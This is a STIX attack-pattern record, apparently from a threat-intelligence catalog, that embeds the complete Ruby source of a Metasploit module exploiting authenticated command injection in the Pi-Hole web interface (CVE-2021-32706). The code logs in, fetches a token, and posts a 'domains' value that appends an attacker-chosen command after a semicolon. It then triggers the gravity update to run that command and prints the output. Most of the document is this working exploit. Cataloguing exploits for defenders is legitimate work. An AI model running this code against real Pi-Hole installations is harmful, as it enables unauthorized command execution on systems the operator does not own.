{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9587879b-538c-4f69-b82d-8bd5d0d9f0b7",
    "created": "2024-08-14T16:23:33.938336Z",
    "modified": "2024-08-14T16:23:33.93834Z",
    "name": "Pi-Hole Top Domains API Authenticated Exec",
    "description": " This exploits a command execution in Pi-Hole Web Interface <= 5.5. The Settings > API/Web inetrace page contains the field Top Domains/Top Advertisers which is validated by a regex which does not properly filter system commands, which can then be executed by calling the gravity functionality.  However, the regex only allows a-z, 0-9, _.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/pihole_domains_api_exec.rb",
            "external_id": "pihole_domains_api_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/pi-hole/AdminLTE/security/advisories/GHSA-5cm9-6p3m-v259"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-32706"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Pihole\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Pi-Hole Top Domains API Authenticated Exec',\n        'Description' => %q{\n          This exploits a command execution in Pi-Hole Web Interface <= 5.5.\n          The Settings > API/Web inetrace page contains the field\n          Top Domains/Top Advertisers which is validated by a regex which does not properly\n          filter system commands, which can then be executed by calling the gravity\n          functionality.  However, the regex only allows a-z, 0-9, _.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'SchneiderSec' # original PoC, discovery\n        ],\n        'References' => [\n          ['URL', 'https://github.com/pi-hole/AdminLTE/security/advisories/GHSA-5cm9-6p3m-v259'],\n          ['CVE', '2021-32706']\n        ],\n        'Targets' => [\n          [ 'Automatic Target', {}]\n        ],\n        'DisclosureDate' => '2021-08-04',\n        'Privileged' => true,\n        'Platform' => ['php'],\n        'Arch' => ARCH_PHP,\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The URI of the Pi-Hole Website', '/']),\n        OptString.new('COMMAND', [ true, 'The command to execute. Only 0-9, a-z, _ are allowed.', 'pwd']),\n      ]\n    )\n  end\n\n  def check\n    begin\n      _version, web_version, _ftl = get_versions\n\n      if web_version.nil?\n        print_error(\"#{peer} - Could not connect to web service - no response or non-200 HTTP code\")\n        return Exploit::CheckCode::Unknown\n      end\n\n      if web_version && Rex::Version.new(web_version) <= Rex::Version.new('5.6')\n        vprint_good(\"Web Interface Version Detected: #{web_version}\")\n        return Exploit::CheckCode::Appears\n      else\n        vprint_bad(\"Web Interface Version Detected: #{web_version}\")\n        return Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"#{peer} - Could not connect to the web service\")\n      return Exploit::CheckCode::Unknown\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def validate_command\n    # https://github.com/pi-hole/AdminLTE/blob/v5.3.1/scripts/pi-hole/php/savesettings.php#L71\n    unless /^((\\*.)?[_a-z\\d](-*[_a-z\\d])*)(\\.([_a-z\\d](-*[a-z\\d])*))*(\\.([_a-z\\d])*)*$/i =~ datastore['COMMAND']\n      fail_with(Failure::BadConfig, 'COMMAND invalid. only _, a-z, 0-9 are allowed.')\n    end\n  end\n\n  def run\n    validate_command\n    if check != Exploit::CheckCode::Appears\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable')\n    end\n\n    # check if we need a login\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'vars_get' => {\n        'tab' => 'api'\n      },\n      'keep_cookies' => true\n    )\n\n    # check if we got hit by a login prompt\n    if res && res.body.include?('Sign in to start your session')\n      res = login(datastore['PASSWORD'])\n      fail_with(Failure::BadConfig, 'Incorrect Password') if res.nil?\n    end\n\n    token = get_token('api')\n\n    if token.nil?\n      fail_with(Failure::UnexpectedReply, 'Unable to find token')\n    end\n    print_status(\"Using token: #{token}\")\n    print_status('Sending payload request')\n    res = send_request_cgi(\n      'uri' => normalize_uri(target_uri.path, 'admin', 'settings.php'),\n      'vars_get' => {\n        'tab' => 'api'\n      },\n      'vars_post' => {\n        'domains' => \"*;#{datastore['COMMAND']}\",\n        'clients' => '',\n        'querylog-permitted' => 'on',\n        'querylog-blocked' => 'on',\n        'field' => 'API',\n        'token' => token\n      },\n      'keep_cookies' => true,\n      'method' => 'POST'\n    )\n    fail_with(Failure::UnexpectedReply, 'Unable to save settings') unless res && res.body.include?('The API settings have been updated')\n    res = update_gravity\n    fail_with(Failure::UnexpectedReply, 'Unable to update gravity') unless res && res.code == 200\n    # first line after our output should be: data:   [i] Neutrino emissions detected...\n    output = res.body.split('   [i] ')[0]\n    # remove beginning of line with data on it\n    output = output.gsub(/^data:/, '')\n    # removing last line since its empty\n    output = output.split[0..]\n\n    print_good(output.join(\"\\n\"))\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-08-04",
    "x_mitre_platforms": [
        "['php']"
    ]
}